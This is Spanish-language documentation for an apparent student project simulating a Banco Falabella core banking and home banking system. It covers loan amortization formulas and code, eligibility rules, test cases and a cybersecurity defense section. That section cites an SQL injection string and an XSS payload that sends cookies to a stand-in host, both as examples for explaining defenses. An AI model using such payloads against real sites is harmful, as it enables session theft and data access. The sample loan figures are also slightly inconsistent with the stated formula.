# 🏦 DOCUMENTACIÓN INTEGRAL DEL SISTEMA BANCARIO Y CORE FINANCIERO — BANCO FALABELLA
**Proyecto:** Simulación Core Bancario & Homebanking Omnicanal  
**Curso / Evaluación:** Entrega Final — Requerimientos y Reto de Ciberseguridad (Semana 9 a Semana 14)

---

## 📑 ÍNDICE DE CONTENIDOS
1. [Tarifario del Producto, Cálculo TEM/TEA y Ubicación en Código](#1-tarifario-del-producto-cálculo-temtea-y-ubicación-en-código)
2. [Requisitos de Crédito y Proforma Referencial (Institución Financiera)](#2-requisitos-de-crédito-y-proforma-referencial-institución-financiera)
3. [Presentación de Dashboard y Analítica Ejecutiva (BI)](#3-presentación-de-dashboard-y-analítica-ejecutiva-bi)
4. [Casos de Prueba End-to-End: Homebanking ➔ Core Bancario](#4-casos-de-prueba-end-to-end-homebanking-➔-core-bancario)
5. [Reto Semana 14: Pruebas y Defensas de Ciberseguridad](#5-reto-semana-14-pruebas-y-defensas-de-ciberseguridad)

---

## 1. TARIFARIO DEL PRODUCTO, CÁLCULO TEM/TEA Y UBICACIÓN EN CÓDIGO

Para el desarrollo del sistema se ha modelado el producto **Crédito Efectivo / Crédito PYME** de **Banco Falabella Perú**. El cálculo de las cuotas mensuales no se realiza de forma lineal simple, sino aplicando estrictamente el **Sistema de Amortización Francés** (cuotas fijas con interés al rebatir).

### 📐 Fórmulas Matemáticas Implementadas

#### A. Conversión de Tasa Efectiva Anual (TEA) a Tasa Efectiva Mensual (TEM)
El tarifario bancario expresa los intereses en **TEA**. Para calcular el cronograma de pagos mensual, el motor convierte la TEA a **TEM** mediante la fórmula compuesta:

$$\text{TEM} = (1 + \text{TEA})^{1/12} - 1$$

*Ejemplo para una TEA del 18.0%: $\text{TEM} = (1 + 0.18)^{0.08333} - 1 = 0.013888 \text{ (1.3888% mensual)}$*

#### B. Cálculo de la Cuota Fija Mensual (Método Francés)
Una vez obtenida la TEM, se determina la cuota constante mensual ($C$) en base al monto solicitado ($M$) y el plazo en meses ($n$):

$$\text{Cuota} = M \times \frac{\text{TEM} \times (1 + \text{TEM})^n}{(1 + \text{TEM})^n - 1}$$

---

### 💻 Evidencia en el Código Fuente (¿Dónde se implementó el cambio?)

Esta lógica matemática se encuentra programada de forma centralizada en **dos módulos críticos** del repositorio para garantizar que tanto la simulación en el portal como el scoring en el core arrojen montos idénticos al céntimo:

#### 1. Módulo de Generación de Cronogramas (Portal Backend)
* **Archivo:** `portal-backend/app/services/credito_service.py`
* **Líneas:** `129 - 136`
* **Función:** `_generar_cronograma()`

```python
def _generar_cronograma(self, db: Session, credito):
    # 1. Conversión exacta de TEA del tarifario a TEM
    tasa_mensual = (1 + float(credito.tasa_interes) / 100) ** (1 / 12) - 1
    monto = float(credito.monto_aprobado or credito.monto_solicitado)
    plazo = credito.plazo_meses
    
    # 2. Fórmula de Cuota Fija (Amortización Francés)
    if tasa_mensual > 0:
        cuota = (monto * tasa_mensual * (1 + tasa_mensual) ** plazo) / ((1 + tasa_mensual) ** plazo - 1)
    else:
        cuota = monto / plazo
```

#### 2. Motor de Evaluación y RDS (Core Backend)
* **Archivo:** `core-backend/app/rules/scoring_rules.py`
* **Líneas:** `115 - 119`
* **Función:** `calcular_rds()`

```python
def calcular_rds(monto: float, plazo: int, tasa_anual: float, ingreso_mensual: float) -> dict:
    # Conversión TEA -> TEM para evaluar capacidad de pago real antes de aprobar
    tasa_mensual = (1 + tasa_anual / 100) ** (1 / 12) - 1
    if tasa_mensual > 0 and plazo > 0:
        cuota = (monto * tasa_mensual * (1 + tasa_mensual) ** plazo) / ((1 + tasa_mensual) ** plazo - 1)
```

---

## 2. REQUISITOS DE CRÉDITO Y PROFORMA REFERENCIAL (INSTITUCIÓN FINANCIERA)

Tomando como base las políticas reales de **Banco Falabella**, el sistema incorpora un motor de elegibilidad que valida automáticamente los requisitos institucionales antes de permitir la radicación de un crédito.

### 📋 Requisitos Institucionales Modelados en el Core
En el archivo `core-backend/app/rules/scoring_rules.py` (función `verificar_elegibilidad`), el sistema exige:
1. **Rango Etario:** Edad mínima de **22 años** y máxima de **70 años** al momento de solicitar el préstamo.
2. **Vinculación Bancaria:** Contar con al menos una **Cuenta de Ahorros** o **Tarjeta CMR** activa en la entidad.
3. **Comportamiento Crediticio:** No registrar 2 o más solicitudes rechazadas en los últimos 6 meses ni presentar historial de mora castigada en centrales de riesgo (SBS / Infocorp).
4. **Capacidad de Pago (Ingreso Mínimo):** Ingreso mensual acreditable desde S/ 1,500 para crédito consumo y S/ 3,500 para productos premium.

### 🧾 Proforma Referencial de Simulación (Evidencia para Presentación)
A continuación se presenta la proforma oficial que genera nuestro Homebanking cuando un cliente solicita una evaluación:

| Parámetro de Proforma | Valor Referencial / Simulación |
| :--- | :--- |
| **Producto Financiero** | Crédito Personal Efectivo / PYME |
| **Monto Solicitado ($M$)** | **S/ 10,000.00** |
| **Plazo de Pago ($n$)** | **12 meses** |
| **Tasa Efectiva Anual (TEA)** | **18.00%** |
| **Tasa Efectiva Mensual (TEM)** | **1.3888%** |
| **Cuota Mensual Estimada ($C$)** | **S/ 911.23** |
| **Seguro de Desgravamen** | S/ 8.50 mensuales (según saldo deudor) |
| **Total Intereses a Pagar** | S/ 934.76 |
| **Costo Total del Crédito** | S/ 10,934.76 |
| **Relación Deuda-Sueldo (RDS)** | **26.03%** *(Semáforo Verde — Aprobación Inmediata)* |

---

## 3. PRESENTACIÓN DE DASHBOARD Y ANALÍTICA EJECUTIVA (BI)

En lugar de depender exclusivamente de reportes estáticos externos, nuestro proyecto integra un **Dashboard Ejecutivo de Business Intelligence (BI)** en tiempo real dentro del módulo de Gerencia y Riesgos del Core Financiero (`/analytics`).

### 📊 Indicadores Clave de Rendimiento (KPIs) Visualizados
1. **Distribución de Carteras por Semáforo RDS:**
   * 🟢 **Verde (Riesgo Bajo ≤ 30%):** Créditos con pase directo y desembolso automático en 1 clic.
   * 🟡 **Amarillo (Riesgo Medio 31% - 45%):** Créditos que requieren revisión humana por un Asesor o Jefe de Créditos.
   * 🔴 **Rojo (Riesgo Alto > 45%):** Créditos bloqueados o derivados a Comité Especial por sobreendeudamiento.
2. **Monitoreo de Morosidad por Bandas de Retraso:**
   * **Preventiva (1–30 días):** Alertas automáticas y notificaciones SMS/Push al homebanking.
   * **Temprana (31–60 días) & Tardía (61–120 días):** Gestión activa del área de cobranzas.
   * **Judicial (121–180 días) & Castigo (>180 días):** Bloqueo de tarjetas CMR y pase a legales.
3. **Concentración de Créditos Corporativos (Clientes 360°):**
   * Visualización del volumen de facturación anual consolidada vs. exposición crediticia por sector económico (Comercio, Textil, Agroindustria, Tecnología).

---

## 4. CASOS DE PRUEBA END-TO-END: HOMEBANKING ➔ CORE BANCARIO

Para validar la solidez del sistema, se han ejecutado y registrado los siguientes casos de prueba interconectando el **Portal Web (Cliente)** con el **Core Financiero (Banco)** mediante API REST en la nube:

### 🧪 Caso de Prueba 1: Aprobación Automática (Fast Track)
* **Actor:** Cliente de Homebanking (Ej. DNI `71234567` - Ingreso S/ 4,500).
* **Acción:** Solicita préstamo de **S/ 5,000** a **12 meses**.
* **Procesamiento en Core:**
  * El Homebanking envía el payload a `POST /scoring/evaluar` en el Core.
  * El motor calcula el Score (`780 puntos`) y el RDS (`12.5%`).
  * Al estar en semáforo **Verde**, el Core responde con ruta `AUTOMATICA`.
* **Resultado:** El crédito pasa al estado `aprobado` e instantáneamente el servicio transfiere los S/ 5,000 a la cuenta de ahorros activa del cliente, generando el calendario de 12 cuotas.

### 🧪 Caso de Prueba 2: Evaluación por Comité de Riesgos
* **Actor:** Cliente de Homebanking solicita **S/ 45,000** a **36 meses**.
* **Procesamiento en Core:**
  * El cálculo arroja un RDS de **41.2%** (Semáforo **Amarillo**).
  * La ruta asignada por el motor es `COMITE`.
* **Resultado:** El crédito queda en estado `en_revision`. En el Core Bancario, un trabajador con rol `riesgos` o `comite` ingresa a su bandeja, revisa el historial 360° del cliente y aprueba o rechaza manualmente la solicitud.

### 🧪 Caso de Prueba 3: Rechazo por Política de Riesgo (Mora / Edad)
* **Actor:** Usuario intenta solicitar un crédito teniendo 21 años o registrando una deuda en banda `castigo` previa.
* **Procesamiento en Core:**
  * La regla de elegibilidad intercepta la solicitud antes de calcular cuotas.
* **Resultado:** El sistema rechaza la operación devolviendo el mensaje exacto de auditoría: *"Edad mínima requerida: 22 años"* o *"Registra historial negativo en centrales de riesgo"*.

---

## 5. RETO SEMANA 14: PRUEBAS Y DEFENSAS DE CIBERSEGURIDAD

En estricto cumplimiento con el reto de ciberseguridad, se han implementado defensas en profundidad para blindar el Homebanking, el Core Bancario y las transacciones financieras:

### 🛡️ 1. Inyección SQL (SQL Injection)
* **Vulnerabilidad evaluada:** Intentos de manipular parámetros de entrada (ej. ingresar `' OR '1'='1` en el campo de búsqueda de DNI o login) para extraer toda la base de datos de clientes.
* **Defensa Implementada:** **Eliminación total de consultas SQL crudas (Raw SQL)** concatenadas mediante strings. Todo el acceso a datos en ambos backends se gestiona a través del ORM transaccional **SQLAlchemy** con vinculación de parámetros parametrizados (`Parameter Binding`).
* **Evidencia en Código:**
  ```python
  # SEGURO: SQLAlchemy parametriza y neutraliza automáticamente los caracteres especiales
  cliente = db.query(Usuario).filter(Usuario.dni == dni_ingresado).first()
  ```

### 🛡️ 2. Cross-Site Scripting (XSS)
* **Vulnerabilidad evaluada:** Inyección de scripts maliciosos (ej. `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`) en campos de texto como el *Propósito del Crédito* o el *Alias de Contacto* para robar sesiones.
* **Defensa Implementada:**
  * **Sanitización del DOM en Frontend:** El portal web está desarrollado con **React/Vite**. JSX trata por defecto todo el contenido dinámico como strings literales y escapa automáticamente caracteres HTML peligrosos (`&`, `<`, `>`, `"`, `'`) antes de renderizarlos en el navegador.
  * **Cabeceras HTTP de Seguridad:** Configuración en el backend de políticas de contenido y aislamiento.

### 🛡️ 3. Insecure Direct Object References (IDOR)
* **Vulnerabilidad evaluada:** Un cliente autenticado intercepta la petición HTTP de consultar créditos y cambia el parámetro `usuario_id` por el ID de otra persona para ver sus cuentas bancarias privadas.
* **Defensa Implementada:** **Validación estricta de propiedad e identidad por Token JWT**.
  * En el Homebanking, los endpoints no confían en el ID enviado por la URL; extraen el ID criptográficamente firmado dentro del token JWT (`get_current_user`). Si un usuario intenta consultar o pagar la cuota de un crédito que no le pertenece, el backend arroja un error `403 Forbidden / 404 Not Found`.
  * En el Core Bancario, cada operación sensible verifica la jerarquía de roles (`get_current_trabajador`). Un asesor regular no puede aprobar créditos reservados para la gerencia.

### 🛡️ 4. Ataques de Fuerza Bruta (Brute Force)
* **Vulnerabilidad evaluada:** Envío masivo automatizado de contraseñas contra el login del personal bancario o clientes para adivinar credenciales accesibles.
* **Defensa Implementada:**
  * **Hashing Criptográfico Robusto:** Almacenamiento exclusivo de contraseñas utilizando el algoritmo **Bcrypt** con generación automática de *Salts* aleatorios (archivo `core-backend/app/security.py`). Es computacionalmente inviable revertir el hash mediante tablas arcoíris.
  * **Seguridad Bancaria Estricta en UI:** Eliminación de los botones de "Login de 1 clic" en el entorno de producción para obligar a la autenticación legítima de credenciales en cada sesión.

### 🛡️ 5. Configuración Insegura (Security Misconfiguration)
* **Vulnerabilidad evaluada:** Exposición de claves de base de datos, puertos abiertos sin protección o políticas CORS permisivas (`Access-Control-Allow-Origin: *`).
* **Defensa Implementada:**
  * **Gestión de Secretos:** Ninguna credencial o clave de base de datos cloud está hardcodeada en el código fuente; se administran de forma aislada mediante variables de entorno (`.env` / Variables de Render).
  * **CORS Restringido:** Los backends tienen listas blancas (`allow_origins`) configuradas para aceptar peticiones únicamente desde los dominios oficiales desplegados en Vercel (`https://proyecto-falabella-tornero-*.vercel.app`).
  * **Integridad Relacional en Base de Datos:** Configuración de llaves foráneas con índices y cascadas (`ON DELETE CASCADE`) para evitar corrupción de datos ante eliminaciones.

---

### 🚀 Resumen del Estado de Despliegue en la Nube
* **Homebanking Web (Clientes):** [https://proyecto-falabella-tornero-ja2i.vercel.app](https://proyecto-falabella-tornero-ja2i.vercel.app)
* **Core Bancario Web (Personal):** [https://proyecto-falabella-tornero-nqff.vercel.app](https://proyecto-falabella-tornero-nqff.vercel.app)
* **API Core Backend (Servidor):** [https://core-backend-g43c.onrender.com](https://core-backend-g43c.onrender.com)
